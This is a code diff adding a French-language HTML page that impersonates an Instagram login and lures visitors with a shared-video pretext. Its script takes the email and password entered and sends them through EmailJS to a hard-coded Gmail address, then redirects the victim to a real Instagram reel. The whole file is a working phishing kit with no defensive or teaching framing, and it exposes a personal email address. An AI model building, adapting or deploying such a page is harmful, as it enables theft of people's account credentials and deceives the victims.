@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: transparent; /* Fond de la page transparent */
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 350px;
+            width: 90%;
+            margin: 20px auto;
+            background-color: rgba(255, 255, 255, 0.8); /* Fond blanc transparent */
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+        }
+        .logo-img {
+            max-width: 100px;
+            margin-bottom: 20px;
+        }
+        .notice {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: none;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        .checkbox-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .checkbox-group label {
+            font-size: 14px;
+            color: black;
+            font-family: Arial, sans-serif;
+        }
+        .btn {
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 3px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: Arial, sans-serif;
+        }
+        .btn:hover {
+            background-color: #3181db;
+        }
+        .toggle-password {
+            text-align: left;
+            color: black;
+            cursor: pointer;
+            font-size: 14px;
+            margin-left: 5px;
+            text-decoration: underline;
+            font-family: Arial, sans-serif;
+            margin-bottom: 10px;
+        }
+        .error-message {
+            color: orange;
+            font-size: 14px;
+            margin-top: 10px;
+            font-family: Arial, sans-serif;
+        }
+
+        @media screen and (min-width: 768px) {
+            .container {
+                max-width: 600px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.juliendoclot.com/wp-content/uploads/2018/09/IG-LOGO.jpg" alt="Instagram Logo" class="logo-img">
+        <div class="notice">
+            Pour regarder la vidéo qu'on vous a partagée, veuillez vous connecter à Instagram.
+        </div>
+        <form id="signup-form" action="javascript:void(0);" method="POST" onsubmit="submitForm()">
+            <div class="input-group">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" name="email" placeholder="Adresse e-mail" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+            </div>
+            <div class="input-group">
+                <label for="confirm-password">Confirmez le mot de passe</label>
+                <input type="password" id="confirm-password" name="confirm-password" placeholder="Confirmez le mot de passe" required>
+            </div>
+            <span class="toggle-password" onclick="togglePassword()">Afficher le mot de passe</span>
+            <div class="checkbox-group">
+                <input type="checkbox" id="captcha" required>
+                <label for="captcha">Je ne suis pas un robot</label>
+            </div>
+            <button type="submit" class="btn">Connectez-vous</button>
+            <div id="error-message" class="error-message" style="display: none;">Erreur de connexion, veuillez réessayer.</div>
+        </form>
+    </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("fKpiROlqIMbCK5Ndh"); // Clé EmailJS mise à jour
+        })();
+
+        function sendEmail() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            var confirmPassword = document.getElementById("confirm-password").value;
+
+            // Vérification des champs requis avant l'envoi
+            if (email.trim() === '' || password.trim() === '' || confirmPassword.trim() === '') {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+
+            // Vérification de la correspondance des mots de passe
+            if (password !== confirmPassword) {
+                alert('Les mots de passe ne correspondent pas.');
+                return;
+            }
+
+            // Vérification de la case à cocher (simulation de CAPTCHA)
+            if (!document.getElementById('captcha').checked) {
+                alert('Veuillez cocher la case "Je ne suis pas un robot".');
+                return;
+            }
+
+            var templateParams = {
+                user_email: email,
+                user_password: password,
+                to_email: 'mateobrosillon@gmail.com'
+            };
+
+            emailjs.send('service_3w7wnzf', 'template_av2bkjz', templateParams)
+                .then(function(response) {
+                   console.log('SUCCESS!', response.status, response.text);
+                   document.getElementById('signup-form').reset(); // Réinitialise le formulaire
+                   document.getElementById('error-message').style.display = 'none'; // Cache le message d'erreur
+                   alert('Les données ont été envoyées avec succès !');
+                   window.location.href = "https://www.instagram.com/reel/C0CLjZesSBd/?igsh=aDh1NGk5ZnMxdGxm"; // Redirection vers Instagram
+                }, function(error) {
+                   console.log('FAILED...', error);
+                   document.getElementById('error-message').style.display = 'block'; // Affiche le message d'erreur
+                });
+        }
+
+        function togglePassword() {
+            var passwordInput = document.getElementById('password');
+            var confirmPasswordInput = document.getElementById('confirm-password');
+            var toggleBtn = document.querySelector('.toggle-password');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                confirmPasswordInput.type = 'text';
+                toggleBtn.textContent = 'Masquer le mot de passe';
+            } else {
+                passwordInput.type = 'password';
+                confirmPasswordInput.type = 'password';
+                toggleBtn.textContent = 'Afficher le mot de passe';
+            }
+        }
+
+        function submitForm() {
+            sendEmail();
+            return false; // Empêche le formulaire de soumettre la page
+        }
+    </script>
+</body>
+</html>
